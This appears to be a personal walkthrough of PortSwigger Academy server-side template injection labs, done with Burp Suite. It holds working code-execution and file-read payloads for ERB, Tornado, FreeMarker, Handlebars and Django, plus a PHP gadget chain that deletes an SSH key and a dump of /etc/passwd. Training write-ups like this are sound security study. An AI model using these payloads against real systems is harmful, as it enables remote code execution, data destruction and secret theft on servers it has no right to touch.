# Portswigger
## Server-side Template Injection (SSTI)
- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/

### Basic server-side template injection
```bash

# This lab is vulnerable to server-side template injection due to the unsafe construction of an ERB template.

# To solve the lab, review the ERB documentation to find out how to execute arbitrary code, then delete the morale.txt file from Carlos's home directory. 

Click on the first item

GET /?message=Unfortunately this product is out of stock HTTP/1.1

Go to: HTTP history
Find:

GET /?message=test HTTP/1.1

Send to Repeater
Send to Intruder
Go to: Intruder
Payload Positions:

GET /?message=§test§ HTTP/1.1

Go to:

https://github.com/payloadbox/ssti-payloads

Copy the payloads and adjust the relevant multiplication expressions to represent 7*7
Go to: Intruder -> Payloads -> Payload Options[Simple list]
Load the SSTI enumeration file
Go to: Options
Grep - Match
Clear
Add '49'
Start attack
Note the '49' response for payload:

<%= 7 * 7 %>

https://0aec00de044f2ff0c06d595a00000000.web-security-academy.net/?message=<%= 7 * 7 %>

Visit:

https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#ruby

Change:

<%= system('cat /etc/passwd') %>

to

<%= system('rm /home/carlos/morale.txt') %>

Go to: Repeater

#GET /?message=<%25%3d+system('rm+/home/carlos/morale.txt')+%25> HTTP/1.1

Response:

HTTP/1.1 200 OK

```

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220601205114.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220601205132.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220601205048.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220601204255.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220601211229.png)

### Basic server-side template injection (code context)
```bash

# This lab is vulnerable to server-side template injection due to the way it unsafely uses a Tornado template. To solve the lab, review the Tornado documentation to discover how to execute arbitrary code, then delete the morale.txt file from Carlos's home directory.

# You can log in to your own account using the following credentials: wiener:peter 

Login as wiener:peter
Change preffered name to: (any other choice than the current selection)

"Nickname" 

Go to: "Home"
Click "View post"
Comment:

comment

Back to blog

Go to: HTTP history
Find:

POST /my-account/change-blog-post-author-display HTTP/1.1

Send to repeater
Change:

blog-post-author-display=user.name&csrf=h1GSO6ntbuhd4CD2HaoZw1usIFupFuXs

To

blog-post-author-display=user.name}}{{7*7}}&csrf=h1GSO6ntbuhd4CD2HaoZw1usIFupFuXs

Go to:

https://0a3d00c1040fc12dc0c79efe00d00074.web-security-academy.net/post?postId=2

Refresh the page
Acknowledge that the username is now:

Peter Wiener49}}

Go to: Repeater
Change

blog-post-author-display=user.name}}{{7*7}}&csrf=h1GSO6ntbuhd4CD2HaoZw1usIFupFuXs

To

blog-post-author-display=user.name}}{{who+am+i}}&csrf=h1GSO6ntbuhd4CD2HaoZw1usIFupFuXs

Go to:

https://0a3d00c1040fc12dc0c79efe00d00074.web-security-academy.net/post?postId=2

Refresh the page
Response:

Internal Server Error
No handlers could be found for logger "tornado.application" Traceback (most recent call last): File "<string>", line 15, in <module> File "/usr/local/lib/python2.7/dist-packages/tornado/template.py", line 317, in __init__ "exec", dont_inherit=True) File "<string>.generated.py", line 9 _tt_tmp = who am i # <string>:1 ^ SyntaxError: invalid syntax

Rerence:

https://www.tornadoweb.org/en/stable/template.html

Change:

blog-post-author-display=user.name}}{{who+am+i}}&csrf=h1GSO6ntbuhd4CD2HaoZw1usIFupFuXs

To

**DISCLAIMER**
Changing curly-bracket notations to normal bracket notations to comply with Jekyll.

blog-post-author-display=user.name]][[%25+import+os+%2][[os.system('rm+/home/carlos/morale.txt')&csrf=h1GSO6ntbuhd4CD2HaoZw1usIFupFuXs

// or // decoded

blog-post-author-display=user.name}}{% import os %}{{os.system('rm /home/carlos/morale.txt')&csrf=h1GSO6ntbuhd4CD2HaoZw1usIFupFuXs

Go to:

https://0a3d00c1040fc12dc0c79efe00d00074.web-security-academy.net/post?postId=2

Refresh the page

```

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220601213436.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220601213451.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220601213704.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220601214405.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220601215011.png)

### Server-side template injection using documentation
```bash

# This lab is vulnerable to server-side template injection. To solve the lab, identify the template engine and use the documentation to work out how to execute arbitrary code, then delete the morale.txt file from Carlos's home directory.

# You can log in to your own account using the following credentials:

# content-manager:C0nt3ntM4n4g3r

Login as content-manager:C0nt3ntM4n4g3r
Go to: "Home"
Click "View post"
Click "Edit template"
Input:

{{7*7}}

Go to: HTTP history
Find:

POST /product/template?productId=1 HTTP/1.1

Send to Repeater
Send to Intruder
Go to: Intruder
Payload Positions:

csrf=uCYZzpxH0VsV0m8idI1h0N7G8qYP8MUW&template=§test§&template-action=preview

Go to:

https://github.com/payloadbox/ssti-payloads

Copy the payloads and adjust the relevant multiplication expressions to represent 7*7
Go to: Intruder -> Payloads -> Payload Options[Simple list]
Load the SSTI enumeration file
Go to: Options
Grep - Match
Clear
Add '49'
Start attack
Note the '49' response for payload:

${7*7}
#{7*7}
#{ 7 * 7 }

Go to:

https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection

Ctrl+f:

${7*7}

Java - Basic injection
Go to:

https://0a4000120354754fc00e04710074005a.web-security-academy.net/product/template?productId=1

Input:

${class.getResource("").getPath()}

Preview
Response:

FreeMarker template error 

Go to:

https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#freemarker
Freemarker - Code execution:

${"freemarker.template.utility.Execute"?new()("rm /home/carlos/morale.txt")}

```

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220601233205.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220601233222.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220601232914.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220601233822.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220601233841.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220601234102.png)

### Server-side template injection in an unknown language with a documented exploit
```bash

# This lab is vulnerable to server-side template injection. To solve the lab, identify the template engine and find a documented exploit online that you can use to execute arbitrary code, then delete the morale.txt file from Carlos's home directory. 

Click on "View details"
Response:

https://0a6f002e041ae688c0bf164a0093002e.web-security-academy.net/?message=Unfortunately%20this%20product%20is%20out%20of%20stock

Go to: HTTP history
Find:

GET /?message=Unfortunately%20this%20product%20is%20out%20of%20stock HTTP/1.1

Send to Repeater
Send to Intruder
Go to: Intruder
Payload Positions:

GET /?message=§test§ HTTP/1.1

Go to:

https://github.com/payloadbox/ssti-payloads

Copy the payloads and adjust the relevant multiplication expressions to represent 7*7
Go to: Intruder -> Payloads -> Payload Options[Simple list]
Load the SSTI enumeration file
Go to: Options
Grep - Match
Clear
Add '49'
Start attack
Note the '49' response for payload:
(There are numerous responses)
I found it easier to just append {{7*7}} to:

https://0a6f002e041ae688c0bf164a0093002e.web-security-academy.net/?message=

Like so:

https://0a6f002e041ae688c0bf164a0093002e.web-security-academy.net/?message={{7*7}}

Response:

Internal Server Error

/usr/local/lib/node_modules/handlebars/dist/cjs/handlebars/compiler/parser.js:267 throw new Error(str); ^ Error: Parse error on line 1: {{7*7}} --^ Expecting 'ID', 'STRING', 'NUMBER', 'BOOLEAN', 'UNDEFINED', 'NULL', 'DATA', got 'INVALID' at Parser.parseError (/usr/local/lib/node_modules/handlebars/dist/cjs/handlebars/compiler/parser.js:267:19) at Parser.parse (/usr/local/lib/node_modules/handlebars/dist/cjs/handlebars/compiler/parser.js:336:30) at HandlebarsEnvironment.parse (/usr/local/lib/node_modules/handlebars/dist/cjs/handlebars/compiler/base.js:46:43) at compileInput (/usr/local/lib/node_modules/handlebars/dist/cjs/handlebars/compiler/compiler.js:515:19) at ret (/usr/local/lib/node_modules/handlebars/dist/cjs/handlebars/compiler/compiler.js:524:18) at [eval]:5:13 at Script.runInThisContext (vm.js:122:20) at Object.runInThisContext (vm.js:329:38) at Object.<anonymous> ([eval]-wrapper:6:22) at Module._compile (internal/modules/cjs/loader.js:778:30)

Google:

search /usr/local/lib/node_modules/handlebars/dist/cjs/handlebars/compiler/parser.js

Handlebars

Google:

Handlebars ssti

Find:

https://mahmoudsec.blogspot.com/2019/04/handlebars-template-injection-and-rce.html

{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return JSON.stringify(process.env);"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}

Change to:

{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').exec('rm /home/carlos/morale.txt');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}

To

{{#with "s" as |string|}}{{#with "e"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub "constructor")}}{{this.pop}}{{#with string.split as |codelist|}}{{this.pop}}{{this.push "return require('child_process').exec('rm /home/carlos/morale.txt');"}}{{this.pop}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}

To (URL-encoded version)

{{%23with+"s"+as+|string|}}{{%23with+"e"}}{{%23with+split+as+|conslist|}}{{this.pop}}{{this.push+(lookup+string.sub+"constructor")}}{{this.pop}}{{%23with+string.split+as+|codelist|}}{{this.pop}}{{this.push+"return+require('child_process').exec('rm+/home/carlos/morale.txt')%3b"}}{{this.pop}}{{%23each+conslist}}{{%23with+(string.sub.apply+0+codelist)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}

Go to: Repeater

GET /?message={{%23with+"s"+as+|string|}}{{%23with+"e"}}{{%23with+split+as+|conslist|}}{{this.pop}}{{this.push+(lookup+string.sub+"constructor")}}{{this.pop}}{{%23with+string.split+as+|codelist|}}{{this.pop}}{{this.push+"return+require('child_process').exec('rm+/home/carlos/morale.txt')%3b"}}{{this.pop}}{{%23each+conslist}}{{%23with+(string.sub.apply+0+codelist)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}} HTTP/1.

Send

```

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220601234926.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220602001136.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220602001424.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220602001802.png)

### Server-side template injection with information disclosure via user-supplied objects
```bash

# This lab is vulnerable to server-side template injection due to the way an object is being passed into the template. This vulnerability can be exploited to access sensitive data.

# To solve the lab, steal and submit the framework's secret key.

# You can log in to your own account using the following credentials:

# content-manager:C0nt3ntM4n4g3r

Login as content-manager:C0nt3ntM4n4g3r
Go to: "View details"
Click "Edit template"
Input {{7*7}}
Preview
Output:

Internal Server Error

Traceback (most recent call last): File "<string>", line 11, in <module> File "/usr/local/lib/python2.7/dist-packages/django/template/base.py", line 191, in __init__ self.nodelist = self.compile_nodelist() File "/usr/local/lib/python2.7/dist-packages/django/template/base.py", line 230, in compile_nodelist return parser.parse() File "/usr/local/lib/python2.7/dist-packages/django/template/base.py", line 486, in parse raise self.error(token, e) django.template.exceptions.TemplateSyntaxError: Could not parse the remainder: '*7' from '7*7'

Django

Refer to:

https://github.com/Lifars/davdts

Input:

{% debug %}

Review
Input:

{{settings.SECRET_KEY}}

Output:

b47c1ee6ef9ckx5gfoiwi2x79ep57l1m

```

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220602003900.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220602011141.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220602011308.png)

### Server-side template injection in a sandboxed environment
```bash

# This lab uses the Freemarker template engine. It is vulnerable to server-side template injection due to its poorly implemented sandbox. To solve the lab, break out of the sandbox to read the file my_password.txt from Carlos's home directory. Then submit the contents of the file.

# You can log in to your own account using the following credentials:

# content-manager:C0nt3ntM4n4g3r

Login as content-manager:C0nt3ntM4n4g3r
Go to: "Home"
Click "View post"
Click "Edit template"
Input:

{{7*7}}

Go to: HTTP history
Find:

POST /product/template?productId=1 HTTP/1.1

Send to Repeater
Send to Intruder
Go to: Intruder
Payload Positions:

csrf=knmUqFqC2GnhjKr2oOeS9Cn3UpStwyp3&template=§%7B%7B7*7%7D%7D§&template-action=preview

Go to:

https://github.com/payloadbox/ssti-payloads

Copy the payloads and adjust the relevant multiplication expressions to represent 7*7
Go to: Intruder -> Payloads -> Payload Options[Simple list]
Load the SSTI enumeration file
Go to: Options
Grep - Match
Clear
Add '49'
Start attack
Note the '49' response for payload:

${7*7}
#{7*7}
#{ 7 * 7 }

Go to:

https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection

Ctrl+f:

${7*7}

Go to:

https://0a8100a2036f7f77c0bc1b8a002d005d.web-security-academy.net/product/template?productId=1

Input:

${class.getResource("").getPath()}

Preview
Response:

FreeMarker template error 

Go to:

https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#freemarker

Change:

${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('path_to_the_file').toURL().openStream().readAllBytes()?join(" ")}

To

${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/home/carlos/my_password.txt').toURL().openStream().readAllBytes()?join(" ")}

Preview
Response:

52 121 114 54 52 48 121 101 100 119 57 105 104 114 114 103 109 53 48 51

Convert the returned bytes to ASCII

Go to:

https://onlineasciitools.com/convert-bytes-to-ascii
Input:

52 121 114 54 52 48 121 101 100 119 57 105 104 114 114 103 109 53 48 51

Output:

4yr640yedw9ihrrgm503

```

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220602013445.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220602014309.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220602014328.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220602014703.png)

### Server-side template injection with a custom exploit
```bash

# This lab is vulnerable to server-side template injection. To solve the lab, create a custom exploit to delete the file /.ssh/id_rsa from Carlos's home directory.

# You can log in to your own account using the following credentials: wiener:peter 

Login as wiener:peter
Change preffered name to: (any other choice than the current selection)

"Nickname" 

Go to: "Home"
Click "View post"
Comment:

comment

Back to blog

Go to: HTTP history
Find:

POST /my-account/change-blog-post-author-display HTTP/1.1

Send to repeater
Change:

blog-post-author-display=user.name&csrf=h1GSO6ntbuhd4CD2HaoZw1usIFupFuXs

To

blog-post-author-display=user.name}}{{7*7}}&csrf=h1GSO6ntbuhd4CD2HaoZw1usIFupFuXs

Go to:

https://0a5d00a803cc5fa5c0c323d000350024.web-security-academy.net/post?postId=10

Refresh the page
Acknowledge that the username is now:

H0td0g49}}

Go to: "My account"
Add an avatar
Intercept is on:
Find:

GET /avatar?avatar=wiener HTTP/1.1

Send to repeater
Add an avatar file that will throw an error
Response:

PHP Fatal error:  Uncaught Exception: Uploaded file mime type is not an image: application/x-desktop in /home/carlos/User.php:28
Stack trace:
#0 /home/carlos/avatar_upload.php(19): User->setAvatar()
#1 main
  thrown in /home/carlos/User.php on line 28

Go to: Repeater

POST /my-account/change-blog-post-author-display HTTP/1.1

blog-post-author-display=user.setAvatar('/etc/passwd')&csrf=2lBmtB05EzcuAUQDwapveJa0k0t2dTvm

Go to:

https://0a5d00a803cc5fa5c0c323d000350024.web-security-academy.net/post?postId=10

Refresh the page
Change:

blog-post-author-display=user.setAvatar('/etc/passwd')&csrf=2lBmtB05EzcuAUQDwapveJa0k0t2dTvm

To

blog-post-author-display=user.setAvatar('/etc/passwd', 'image/jpg')&csrf=2lBmtB05EzcuAUQDwapveJa0k0t2dTvm

Refresh the page
No error
Go to: Repeater
Find:

GET /avatar?avatar=wiener HTTP/1.1

Send

root:x:0:0:root:/root:/bin/
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
peter:x:12001:12001::/home/peter:/bin/
carlos:x:12002:12002::/home/carlos:/bin/
user:x:12000:12000::/home/user:/bin/
elmer:x:12099:12099::/home/elmer:/bin/
academy:x:10000:10000::/academy:/bin/
messagebus:x:101:101::/nonexistent:/usr/sbin/nologin
dnsmasq:x:102:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin

Go to: Repeater
Find:

POST /my-account/change-blog-post-author-display HTTP/1.

Change:

blog-post-author-display=user.setAvatar('/etc/passwd', 'image/jpg')&csrf=2lBmtB05EzcuAUQDwapveJa0k0t2dTvm

To

blog-post-author-display=user.setAvatar('/home/carlos/User.php', 'image/jpg')&csrf=2lBmtB05EzcuAUQDwapveJa0k0t2dTvm

Refresh the page
No error
Go to: Repeater
Find:

GET /avatar?avatar=wiener HTTP/1.1

Send
Response:

    public function gdprDelete() {
        $this->rm(readlink($this->avatarLink));
        $this->rm($this->avatarLink);
        $this->delete();
    }

Point user.setAvatar to the '/home/carlos/.ssh/id_rsa' file then call gdprDelete() function

Go to: Repeater
Find:

POST /my-account/change-blog-post-author-display HTTP/1.

Change:

blog-post-author-display=user.setAvatar('/home/carlos/User.php', 'image/jpg')&csrf=2lBmtB05EzcuAUQDwapveJa0k0t2dTvm

To

blog-post-author-display=user.setAvatar('/home/carlos/.ssh/id_rsa', 'image/jpg')&csrf=2lBmtB05EzcuAUQDwapveJa0k0t2dTvm

Go to: Repeater
Find:

GET /avatar?avatar=wiener HTTP/1.1

Send
**Refresh the page**
No error
Go to: Repeater
Find:

POST /my-account/change-blog-post-author-display HTTP/1.

Change:

blog-post-author-display=user.setAvatar('/home/carlos/.ssh/id_rsa', 'image/jpg')&csrf=2lBmtB05EzcuAUQDwapveJa0k0t2dTvm

To

blog-post-author-display=user.gdprDelete()&csrf=2lBmtB05EzcuAUQDwapveJa0k0t2dTvm

```

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220602015431.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220602015514.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220602015536.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220602020549.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220602021057.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220602021106.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220602022327.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220602021802.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220602021920.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220602022419.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220602022358.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220602022525.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220602022956.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220602030914.png)

#hacking

